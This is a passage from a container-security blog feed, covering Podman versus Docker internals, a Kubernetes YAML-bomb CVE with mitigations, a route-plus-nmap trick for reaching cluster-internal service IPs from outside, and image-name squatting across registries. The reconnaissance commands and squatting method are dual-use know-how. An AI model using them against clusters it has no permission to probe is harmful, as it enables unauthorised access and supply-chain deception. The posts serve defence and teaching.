  &lt;li&gt;There’s no shared network for rootless containers.  Each one is plumbed into a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tap&lt;/code&gt; interface which is then networked out to the host by slirp4netns.  So if you start two containers in rootless mode, by default, they can’t talk directly to each other without exposing ports on the host.&lt;/li&gt;
  &lt;li&gt;All your containers get the same IP address.  On the installation I’m using they all get &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;10.0.2.100&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;By comparison, if you run containers rootfully, the networking looks much more similar to the default Docker configuration. Containers will get an individual IP address, and will be able to communicate with other containers on the bridge network that they’ve been connected to.&lt;/p&gt;

&lt;h2 id=&quot;podman-networking---usable-macvlan&quot;&gt;Podman Networking - Usable MacVLAN&lt;/h2&gt;

&lt;p&gt;Anyone who’s dug around in Docker networking for a while, will likely have come across the MacVLAN network type.  This is kind of like a VMWare Workstation/Fusion bridge network, where the container gets placed on the the same network as the host, getting rid of the need for explicit port forwarding.&lt;/p&gt;

&lt;p&gt;The downside to Docker’s implementation has always been that there’s no support for DHCP with MacVLAN, so you need to have a range of IP addresses to assign to the container that aren’t going to be used elsewhere.&lt;/p&gt;

&lt;p&gt;When I was looking round Podman’s networking options, I noticed that there’s a plug-in that can allow Rootfull podman containers to do something similar, but with DHCP support.  This basically follows &lt;a href=&quot;https://www.redhat.com/sysadmin/leasing-ips-podman&quot;&gt;this post&lt;/a&gt; on the Redhat blog, but there’s a couple of details that worked differently on the system I was running on.&lt;/p&gt;

&lt;p&gt;After creating a network config, as mentioned in the post you start the DHCP plug-in.  On ubuntu this is in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/opt/cni/bin&lt;/code&gt; instead of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/usr/libexec/cni&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;You can then run a container attached to that network and it’ll get an IP address on the same LAN as your host.  In my set-up this took a couple of seconds to do and you get some “network is down” messages as it’s starting, which can be a bit disconcerting, but it does work!&lt;/p&gt;

&lt;h2 id=&quot;rootless-containers---and-user-sessions&quot;&gt;Rootless containers - and user sessions&lt;/h2&gt;

&lt;p&gt;One thing I noted whilst using Podman this week, which was a surprise to me was that containers launched by a user survive that user logging out and back in again. I had assumed that the container would come under the user session that launched them, and so would be terminated when the user logged out, however that’s not what happens, the container will keep running and be available when you log back in, which is handy.&lt;/p&gt;

</description>
				<pubDate>Sun, 23 Feb 2020 11:10:39 +0000</pubDate>
				<link>/blog/2020/02/23/More-Podman/</link>
				<guid isPermaLink="true">/blog/2020/02/23/More-Podman/</guid>
			</item>
		
			<item>
				<title>Comparing Docker and Podman - Basic Operations</title>
				<description>&lt;h1 id=&quot;introduction&quot;&gt;Introduction&lt;/h1&gt;

&lt;p&gt;I’ve been meaning to take more of a look at &lt;a href=&quot;https://podman.io/&quot;&gt;podman&lt;/a&gt; for a while. This is a Redhat backed project which provides an alternative to Docker for local operation of containers.  One of it’s big selling points over the current versions of Docker is the ability to run containers as an ordinary user, without needing access to a daemon process running as root (it’s worth noting that Docker are &lt;a href=&quot;https://docs.docker.com/engine/security/rootless/&quot;&gt;working on&lt;/a&gt; ‘rootless’ mode too)&lt;/p&gt;

&lt;p&gt;What I thought would be useful would be to compare the two with common use-cases and see some of what’s going on under the hood.  Both projects use &lt;a href=&quot;https://github.com/opencontainers/runc&quot;&gt;runc&lt;/a&gt; as the underlying tool for launching containers, but the higher level components are quite different.&lt;/p&gt;

&lt;h2 id=&quot;installation&quot;&gt;Installation&lt;/h2&gt;

&lt;p&gt;For these tests I installed Docker-CE on Ubuntu 18.04.3, following the Docker install process &lt;a href=&quot;https://docs.docker.com/install/linux/docker-ce/ubuntu/&quot;&gt;here&lt;/a&gt; and installed Docker 19.03.5. For podman I made use of the Ubuntu installation instructions &lt;a href=&quot;https://podman.io/getting-started/installation&quot;&gt;here&lt;/a&gt; using the packages provided by the &lt;a href=&quot;https://kubic.opensuse.org/&quot;&gt;kubic project&lt;/a&gt; I installed Podman version 1.7.0.&lt;/p&gt;

&lt;p&gt;I was pleasantly surprised to find that it’s possible to have both podman and Docker installed on the same host using this method, the deb’s provided didn’t clash at all with regards to dependencies.&lt;/p&gt;

&lt;h2 id=&quot;initial-post-installation&quot;&gt;Initial Post Installation&lt;/h2&gt;

&lt;p&gt;After installation, with Docker there are two daemon processes running, containerd and dockerd.  With podman, as expected, there are no long running processes initially.  One thing I did notice, which was unexpected was that after running the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;podman info&lt;/code&gt; command, a podman process was left running on the host.&lt;/p&gt;

&lt;h2 id=&quot;image-storage&quot;&gt;Image storage&lt;/h2&gt;

&lt;p&gt;The Docker daemon stores all the files related to it in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var/lib/docker&lt;/code&gt; which obviously won’t make sense for a container tool that’s running for the individual user.  Podman stores its files at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/home/$USER/.local/share/containers/storage&lt;/code&gt; .  One point that could be relevant here for some use cases is that this will mean that if you have multiple users on a host running containers, each user will pull and store their own copy of all images, which would take some additional storage&lt;/p&gt;

&lt;h2 id=&quot;basic-commands&quot;&gt;Basic commands&lt;/h2&gt;

&lt;p&gt;Running a basic interactive container with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;podman run -it ubuntu:18.04 /bin/bash&lt;/code&gt; works as expected and lands you in a “root” shell inside the container.  One interesting point is that, on Ubuntu, podman defaults to requesting images from Docker Hub first, although it does support a registry search order.  This is an important point for security as having a different search order for container images could result in unexpected behaviour (more details on this &lt;a href=&quot;https://raesene.github.io/blog/2019/09/25/typosquatting-in-a-multi-registry-world/&quot;&gt;here&lt;/a&gt; and &lt;a href=&quot;https://github.com/containers/libpod/issues/4549&quot;&gt;here&lt;/a&gt;)&lt;/p&gt;

&lt;h2 id=&quot;processes-behind-the-scenes&quot;&gt;Processes behind the scenes&lt;/h2&gt;

&lt;p&gt;What’s happening behind the scenes for this command is quite interesting.  There’s a couple of processes being used to manage our ubuntu container.  A &lt;a href=&quot;https://github.com/rootless-containers/slirp4netns&quot;&gt;slirp4netns&lt;/a&gt; process is running.  This is a tool which helps networking work in unprivileged containers.&lt;/p&gt;

&lt;p&gt;There’s also a &lt;a href=&quot;https://github.com/containers/conmon&quot;&gt;conmon&lt;/a&gt; process running, which is another helper process.&lt;/p&gt;

&lt;p&gt;These two processes are used for every container, so if you run 10 containers, you’ll get 20 supporting processes.&lt;/p&gt;

&lt;p&gt;Comparing this to Docker, conmon seems to be the equivalent of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;containerd-shim&lt;/code&gt; process that runs with every container and there’s no &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;slirp4netns&lt;/code&gt; equivalent needed as Docker is running with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt; privileges.&lt;/p&gt;

&lt;h2 id=&quot;namespaces&quot;&gt;Namespaces&lt;/h2&gt;

&lt;p&gt;Docker uses Linux namespaces to provide an isolated environment for contained processes, and as they both use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;runc&lt;/code&gt; under the covers, it’s not too surprising to see that &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;podman&lt;/code&gt; is similar. There are some differences though that are worth noting.  Running &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;lsns&lt;/code&gt; on a host running an ubuntu container via podman we can see the following&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;4026532621 user        4  1352 rorym            podman
4026532622 mnt         2  1352 rorym            podman
4026532624 net         1  1479 rorym            /bin/bash
4026532679 mnt         1  1479 rorym            /bin/bash
4026532680 mnt         1  1465 rorym            /usr/bin/slirp4netns --disable-host-loopback --mtu 65520 --e
4026532681 uts         1  1479 rorym            /bin/bash
4026532682 ipc         1  1479 rorym            /bin/bash
4026532683 pid         1  1479 rorym            /bin/bash
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Running &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;lsns&lt;/code&gt; on a Docker container doing using the same image and command we get&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;4026532626 mnt         1  1932 root             /bin/bash
4026532627 uts         1  1932 root             /bin/bash
4026532628 ipc         1  1932 root             /bin/bash
4026532629 pid         1  1932 root             /bin/bash
4026532631 net         1  1932 root             /bin/bash
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The podman list includes a user namespace which isn’t too surprising as we’re running as an ordinary user, but appear to be the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt; user inside the container.  What is interesting is that there’s a single user namespace which is attached to the podman process, rather than it being directly attached to the container.  Also we can see that there’s a mnt namespace for slirp4netns.&lt;/p&gt;

&lt;h2 id=&quot;capabilities&quot;&gt;Capabilities&lt;/h2&gt;

&lt;p&gt;By default, Docker containers get a set of capabilities, which can allow them to execute operations which require root privileges.  While podman is running as an ordinary user and making use of user namespaces, it does still use capabilities, but unlike Docker they only allow privileges within the user namespace and not over the entire host.&lt;/p&gt;

&lt;p&gt;Running &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pscap&lt;/code&gt; under podman shows the following lines relevant to podman&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1     1352  rorym       podman pause      full
1     1465  rorym       slirp4netns       net_bind_service
1     1468  rorym       conmon            full
1468  1479  rorym       bash              chown, dac_override, fowner, fsetid, kill, setgid, setuid, setpcap, net_bind_service, net_raw, sys_chroot, mknod, audit_write, setfcap
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;For Docker we get :-&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;978   1913  root        containerd-shim   full
1913  1932  root        bash              chown, dac_override, fowner, fsetid, kill, setgid, setuid, setpcap, net_bind_service, net_raw, sys_chroot, mknod, audit_write, setfcap
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The key difference being the 4 processes running for podman are all in a user namespace.&lt;/p&gt;

&lt;h2 id=&quot;apparmor&quot;&gt;AppArmor&lt;/h2&gt;

&lt;p&gt;Docker provides a default AppArmor policy which restricts the contained process.  Looking at the podman setup, there doesn’t appear to be an apparmor policy getting enabled by default.  Running &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;aa-status&lt;/code&gt; shows 0 processes in enforce mode.&lt;/p&gt;

&lt;h2 id=&quot;seccomp&quot;&gt;Seccomp&lt;/h2&gt;

&lt;p&gt;Docker also uses a &lt;a href=&quot;https://www.kernel.org/doc/html/v4.16/userspace-api/seccomp_filter.html&quot;&gt;seccomp-bpf&lt;/a&gt; filter to restrict calls to specific syscalls.  Looking at the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;bash&lt;/code&gt; process running under Podman, we can see that there is also a Seccomp profile attached there&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;cat /proc/1479/status | grep Seccomp
Seccomp:	2
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;limitations-of-rootless-containers&quot;&gt;Limitations of rootless containers&lt;/h2&gt;

&lt;p&gt;With the use of rootless containers, there does come some limitations/complications.  There are some things that won’t work in rootless mode.  Things like not being able to bind ports &amp;lt; 1024 make sense as this is a feature generally restricted for the root user.  However, some of the other items that are root only might be a surprise like network management.&lt;/p&gt;

&lt;p&gt;As Dan Walsh &lt;a href=&quot;https://twitter.com/rhatdan/status/1225797102820716544&quot;&gt;points out&lt;/a&gt; podman can also run containers as root, and that’s something I’ll explore more in the &lt;a href=&quot;https://raesene.github.io/blog/2020/02/23/More-Podman/&quot;&gt;next post&lt;/a&gt;&lt;/p&gt;

&lt;h1 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h1&gt;

&lt;p&gt;It’s clear that the podman ecosystem is coming along quite well and that, for a lot of use cases, it could be used by developers on local machines to avoid the overhead and security risk of running a root daemon to allow for container use.  There are some limitations, but those seem to be more about the inherent limits of running as an unprivileged user than anything else.&lt;/p&gt;
</description>
				<pubDate>Sat, 01 Feb 2020 11:10:39 +0000</pubDate>
				<link>/blog/2020/02/01/Comparing-Docker-And-Podman/</link>
				<guid isPermaLink="true">/blog/2020/02/01/Comparing-Docker-And-Podman/</guid>
			</item>
		
			<item>
				<title>From Stackoverflow to CVE, with some laughs along the way</title>
				<description>&lt;h2 id=&quot;discovery&quot;&gt;Discovery&lt;/h2&gt;

&lt;p&gt;A couple of weeks ago I was on Stackoverflow and noticed an &lt;a href=&quot;https://stackoverflow.com/questions/58129150/security-yaml-bomb-user-can-restart-kube-api-by-sending-configmap/58133282#58133282&quot;&gt;interesting post&lt;/a&gt; with one of my watched tags. The post described a problem where the user had submitted a YAML manifest to their Kubernetes server and caused very high CPU/memory usage, indicating that there could be an application Denial of service issue.&lt;/p&gt;

&lt;p&gt;The YAML posted was a lightly modified version of the YAML bomb example on this &lt;a href=&quot;https://en.wikipedia.org/wiki/Billion_laughs_attack&quot;&gt;Wikipedia page&lt;/a&gt; about the “Billion Laughs Attack”.  This is an issue mainly associated with XML parsing where recursive entities can be defined in a document and, when expanding them, the process parsing the document consumes large amounts of CPU and memory.&lt;/p&gt;

&lt;p&gt;A bit of checking seemed to show that this indeed was a valid issue but that the resource utilization was on the client-side in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;kubectl&lt;/code&gt; and not server-side, so it wouldn’t seem like a major issue.&lt;/p&gt;

&lt;p&gt;That changed after conferring with Brad Geesaman and Jordan Liggitt on the Kubernetes slack as it became obvious that the Denial of Service could occur on either the client or server, depending on how the document was passed to the server. When &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;kubectl&lt;/code&gt; was used the YAML was parsed locally before being passed to the Kubernetes API server, however by using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;curl&lt;/code&gt; the YAML could be passed directly to the API server causing the YAML to be parsed server-side.&lt;/p&gt;

&lt;p&gt;Doing some initial testing on a local VM it was obvious that the server could be DoS’d with a relatively small number of requests and Brad checked that this could also impact cloud hosted versions. The example given did require the attacker to be able to create &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;configMap&lt;/code&gt; objects on the server, which reduced the number of potential attackers considerably, so this would be an moderately serious issue but not too bad, as it required an authenticated user.&lt;/p&gt;

&lt;p&gt;After that though, some more investigation did show that, under some circumstances, it was possible to pass YAML to the server as an unauthenticated user, which makes the issue more serious, especially if your Kubernetes cluster is exposed to the Internet.  This is a (somewhat surprisingly) common configuration, with over 200,000 Kubernetes servers being internet facing (based on statistics from &lt;a href=&quot;https://www.binaryedge.io/&quot;&gt;Binary Edge&lt;/a&gt;).  It won’t always be the case that older clusters are vulnerable (as it depends on the exact configuration) but it’s more likely.&lt;/p&gt;

&lt;p&gt;After the &lt;a href=&quot;https://github.com/kubernetes/kubernetes/issues/83253&quot;&gt;issue&lt;/a&gt; had been reported to the Kubernetes security team they quickly had a CVE assigned and arranged for patch releases to be created which are dropping today, covering versions 1.13 and up.&lt;/p&gt;

&lt;h2 id=&quot;mitigation&quot;&gt;Mitigation&lt;/h2&gt;

&lt;p&gt;There are a couple of mitigations that can be applied to avoid this being an issue for your Kubernetes cluster.  Firstly, ensure that you apply the available patches or, if you are using a managed Kubernetes distribution, ensure that your vendor has patched the issue.&lt;/p&gt;

&lt;p&gt;Secondly, consider whether your Kubernetes server needs to be directly exposed to the Internet, or whether access to it can be restricted using firewalling or placing it behind a bastion host or VPN.&lt;/p&gt;

&lt;p&gt;Another good mitigation is to minimize or remove anonymous access from the Kubernetes API server, although care is needed here as some monitoring tools require unauthenticated access to some endpoints.  Some older versions of Kubernetes allowed quite a few unauthenticated requests, including some which can trigger this issue.  Removing access from the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;system:unauthenticated&lt;/code&gt; user or setting &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--anonymous-auth=false&lt;/code&gt; on the API server can reduce the risk of this issue being triggered on a cluster.  Again, if you’re using a managed Kubernetes distribution, you’ll need to speak to your vendor about enabling those flags.&lt;/p&gt;

&lt;h2 id=&quot;underlying-library---a-tale-of-differing-perspectives&quot;&gt;Underlying library - A tale of differing perspectives&lt;/h2&gt;

&lt;p&gt;After looking at the Kubernetes perspective, I thought it would be interesting to dig down to where this issue originated, to see if it may have a wider impact.&lt;/p&gt;

&lt;p&gt;The affected code comes from the &lt;a href=&quot;https://github.com/go-yaml/yaml&quot;&gt;go-yaml&lt;/a&gt; library.  I reported the issue to the Go security team and they got in touch with the library author.  A fix, which already existed in a later version of the library, was quickly put in place for the v2 one (which was used by Kubernetes). However at this point an interesting difference of opinion cropped up.&lt;/p&gt;

&lt;p&gt;I suggested raising a CVE for this issue to help awareness for downstream projects.  The author felt that, as the original code was compliant with the YAML specification, this was unnecessary and the Go security team felt that it wasn’t their role to assign one.&lt;/p&gt;

&lt;p&gt;Both of these positions make sense, when considered from their respective positions. But, this causes quite a serious problem from a security community perspective.&lt;/p&gt;

&lt;p&gt;The problem is that CVEs are used by most software security tools as flags to indicate “this library needs to be upgraded”. Without a CVE it’s very likely that automated software scanning tools (that are used in many enterprises for software vulnerability management) won’t flag this issue, and that unless teams manually review the changelogs of all their dependencies (a large task) they’ll be unaware of the potential risk.&lt;/p&gt;

&lt;p&gt;The library in question is heavily used in the Go community, with around 36000 code references on Github alone, and presumably a lot of use elsewhere as YAML is a common format in the Cloud Native space where Go is often used.&lt;/p&gt;

&lt;p&gt;It also raises the possibility of confusion if the Kubernetes CVE is used as an ersatz stand-in for a library one.  It’s already possible to see other projects which use the library referencing the Kubernetes CVE as a driver for updating their library version, which would seem very odd if you don’t know the back-story.&lt;/p&gt;

&lt;p&gt;This is also an example of a possible expectations gap between different groups.  The enterprise IT/Security communities might be expecting the CVE databases to be the canonical source of vulnerabilities that they can use to prioritise software and library upgrades but if the software development communities don’t see the necessity of always assigning a CVE, that expectation won’t hold…&lt;/p&gt;
</description>
				<pubDate>Tue, 15 Oct 2019 18:10:39 +0100</pubDate>
				<link>/blog/2019/10/15/From-stackoverflow-to-CVE/</link>
				<guid isPermaLink="true">/blog/2019/10/15/From-stackoverflow-to-CVE/</guid>
			</item>
		
			<item>
				<title>Accessing Cluster IPs from the Outside</title>
				<description>&lt;p&gt;This is a neat trick which could be useful when troubleshooting Kubernetes services or testing Kubernetes clusters.  This got used in a &lt;a href=&quot;https://tgik.io&quot;&gt;TGIK&lt;/a&gt; episode a while back and I’ve been meaning to test it and write it up for a while, as I’ve not seen many docs on it.&lt;/p&gt;

&lt;p&gt;When you run Kubernetes services, generally they are of type “ClusterIP” which means they get assigned a fixed IP address inside the cluster, but this IP address isn’t visible externally (it’s not designed for external users to contact the service, that’s what Ingress resources or NodePort services are for).&lt;/p&gt;

&lt;p&gt;However, given the way Kubernetes works, it’s possible to access these service IP addresses by the simple expedient of …. Adding a route to them :)  Essentially Kubernetes nodes are Linux routers and kube-proxy will direct traffic for us and doesn’t generally care what generated that traffic.&lt;/p&gt;

&lt;p&gt;Let’s provide a concrete example.  I’ve got a single node Kubeadm cluster with a single Ethernet interface &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ens33&lt;/code&gt; with an IP address of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;172.16.198.131&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;The servce IP address range defined on the cluster is the standard &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;10.96.0.0/12&lt;/code&gt; . If I try to scan a service listening in that range on &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;10.105.140.70:3000&lt;/code&gt; for example from a host outside the cluster, I’ll get told that port is filtered. One point to note here (as suggested by &lt;a href=&quot;https://twitter.com/TinkerFairy_Net&quot;&gt;@TinkerFairy_Net&lt;/a&gt;) is that filtered from an nmap TCP scan means it didn’t receive any response to the request, not that there’s some security measure preventing access.&lt;/p&gt;

&lt;p&gt;One other point about the command below is that you need the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-Pn&lt;/code&gt; switch to disable nmap’s Ping scanning which it usually does to determine if a host is live.  Service IPs aren’t real machines, so they won’t respond on any port other than the service one.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sudo nmap -Pn -sT -n -p3000 10.105.140.70

Starting Nmap 7.60 ( https://nmap.org ) at 2019-10-03 19:51 BST
Nmap scan report for 10.105.140.70
Host is up.

PORT     STATE    SERVICE
3000/tcp filtered ppp

Nmap done: 1 IP address (1 host up) scanned in 2.04 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;So we can’t get to that port on that IP address. Now lets try adding a route to the service IP address network via the cluster node’s main IP address.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sudo ip route add 10.96.0.0/12 via 172.16.198.131
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This change essentially tells our client machine that there’s another router on the network and that for traffic in the range &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;10.96.0.0/12&lt;/code&gt; it should send the packets to our Kubernetes cluster node for onwards transmission.&lt;/p&gt;

&lt;p&gt;Now if we retry the same command&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sudo nmap -Pn -sT -n -p3000 10.105.140.70

Starting Nmap 7.60 ( https://nmap.org ) at 2019-10-03 19:53 BST
Nmap scan report for 10.105.140.70
Host is up (0.00074s latency).

PORT     STATE SERVICE
3000/tcp open  ppp

Nmap done: 1 IP address (1 host up) scanned in 0.03 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Our port is open :)&lt;/p&gt;

&lt;p&gt;So we can interrogate any service in that network from outside the cluster (and without any rights to the cluster!) without restriction.&lt;/p&gt;

&lt;p&gt;From a security point, the important thing to take away here is, don’t assume that services are protected because they’re not hooked into an ingress, if an attacker can route traffic to the cluster, they can just do this to see those IP addresses.&lt;/p&gt;
</description>
				<pubDate>Thu, 03 Oct 2019 18:10:39 +0100</pubDate>
				<link>/blog/2019/10/03/accessing-cluster-ips-from-the-outside/</link>
				<guid isPermaLink="true">/blog/2019/10/03/accessing-cluster-ips-from-the-outside/</guid>
			</item>
		
			<item>
				<title>Container Image Squatting in a Multi-Registry World</title>
				<description>&lt;p&gt;I’ve been starting to have a look at &lt;a href=&quot;https://podman.io/&quot;&gt;podman&lt;/a&gt; recently and in doing so, I noticed something potentially interesting from a security perspective, which is how podman handles the pulling of new container images.  As podman is billed as a “drop-in” replacement for Docker (and indeed provides a package to alias docker commands to their podman equivalents), it’s interesting to note how default settings might differ, as these differences could trip up unsuspecting users moving from Docker to podman.&lt;/p&gt;

&lt;p&gt;One of the more fixed things in the Docker landscape is how it address container image registries. Docker hub is hard coded in the source code of Docker as the default registry, so that if you do something like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;docker pull nginx&lt;/code&gt; or &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;docker pull raesene/alpine-containertools&lt;/code&gt; it will assume that you’re looking for these images on Docker Hub.  If you want to pull from an alternate registry, you need to provide the hostname and port of that registry server.&lt;/p&gt;

&lt;p&gt;This behaviour appears to have been a source of frustration for other organizations in the container ecosystem, so it’s not really a surprise to find that it works differently when you use other tools, like podman.&lt;/p&gt;

&lt;p&gt;What podman does is allow users to specify their registry search order via a configuration file stored at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/containers/registries.conf&lt;/code&gt;. On a CentOS8 install the default registry search order is this&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[registries.search]
registries = ['registry.redhat.io', 'quay.io', 'docker.io']
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;From that, we can see that both Redhat’s registry and Quay come in before Docker.&lt;/p&gt;

&lt;p&gt;This has a potentially interesting side effect from a security perspective, which is, if a user requests an image without specifying the host name and port of the registry, they could get the wrong image.&lt;/p&gt;

&lt;p&gt;To give an example. On Docker hub there’s an image I have with some container tooling called &lt;a href=&quot;https://hub.docker.com/r/raesene/alpine-containertools&quot;&gt;alpine-containertools&lt;/a&gt;.  As an experiment I tried creating the same image name with totally different content on Quay.io which is &lt;a href=&quot;https://quay.io/repository/raesene/alpine-containertools&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;So if you use podman and run &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;docker pull raesene/alpine-containertools&lt;/code&gt; you’re going to get the wrong image.&lt;/p&gt;

&lt;p&gt;This could lead to attackers essentially squatting on common Docker Hub accounts to try and trick users into pulling malicious images.  A process made somewhat easier by the fact that you can register organization names on Quay.io (for example, I registered &lt;a href=&quot;https://quay.io/organization/nccgroup&quot;&gt;nccgroup&lt;/a&gt;).&lt;/p&gt;

&lt;h2 id=&quot;what-can-you-do-about-this&quot;&gt;What can you do about this?&lt;/h2&gt;

&lt;p&gt;Well if you’re planning to adopt podman there’s a couple of things you could do to mitigate this risk&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Change the search order in registries.conf to have &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;docker.io&lt;/code&gt; first, which essentially restores the default behaviour (although it could still produce unexpected results if you misspell your pull request)&lt;/li&gt;
  &lt;li&gt;Remove the other registries from the file altogether (which essentially makes the behaviour the same as Docker)&lt;/li&gt;
  &lt;li&gt;Ensure that you’ve registered any names you use on Docker Hub on Quay.io (this only works where you’re pulling Docker Hub images from accounts you control, but of course who pulls Docker Hub images from accounts they don’t control!)&lt;/li&gt;
  &lt;li&gt;Use FQDNs for all your &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pull&lt;/code&gt; or &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;run&lt;/code&gt; statements, essentially bypassing the search order.&lt;/li&gt;
  &lt;li&gt;Make use of image signing to check that the image pulled is the same as that which was expected.&lt;/li&gt;
&lt;/ul&gt;
</description>
				<pubDate>Wed, 25 Sep 2019 18:10:39 +0100</pubDate>
				<link>/blog/2019/09/25/typosquatting-in-a-multi-registry-world/</link>
				<guid isPermaLink="true">/blog/2019/09/25/typosquatting-in-a-multi-registry-world/</guid>
			</item>
		
			<item>
				<title>Kubernetes Security Lab with Kind and Ansible</title>
				<description>&lt;p&gt;Being able to practice exploits and attacks is always useful for security testers, whether it’s working out whether a tool is working properly, or fine-tuning the syntax for a command in a predictable environment, it’s a very handy technique.  One factor that can slow this down is having to rely on external resources, like Virtual Machines or cloud based resources, for running our tests.  Ideally we should be able to run everything locally on a single machine.&lt;/p&gt;

&lt;p&gt;In the past I’ve looked at using &lt;a href=&quot;https://kind.sigs.k8s.io&quot;&gt;kind&lt;/a&gt; for this (with &lt;a href=&quot;https://raesene.github.io/blog/2019/03/04/kind-of-insecure-test-clusters/&quot;&gt;kind of insecure&lt;/a&gt;).  This works pretty well, but there are some limitations on what we can do in terms of setting up vulnerable environments with just kind on it’s own.&lt;/p&gt;

&lt;p&gt;Adding a configuration management tool to the mix can let us easily create more complex test environments.  Enter &lt;a href=&quot;https://www.ansible.com/&quot;&gt;Ansible&lt;/a&gt; which works pretty well for this application. It doesn’t require any server infrastructure, which is good for this kind of setup, and it’s possible to define a Docker container as the host for applying the actions to via a playbook.&lt;/p&gt;

&lt;h2 id=&quot;kube-security-lab&quot;&gt;Kube Security Lab&lt;/h2&gt;

&lt;p&gt;So I’ve started off the process of creating a set of vulnerable clusters as Ansible playbooks and put it &lt;a href=&quot;https://github.com/raesene/kube_security_lab&quot;&gt;here&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;The idea is that the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;client-machine.yml&lt;/code&gt; playbook can be used to spin up a container with client tools installed (it’s just an instance of &lt;a href=&quot;https://hub.docker.com/r/raesene/alpine-containertools&quot;&gt;this image&lt;/a&gt; at the moment) and then bring up one or more of the vulnerable clusters as playbooks, practice attacking that configuration and then easily remove both the cluster and client container.&lt;/p&gt;

&lt;p&gt;In general you can spin up the client machine and a sample cluster, then port-scan the target cluster to see what’s exposed and start attacking things!&lt;/p&gt;

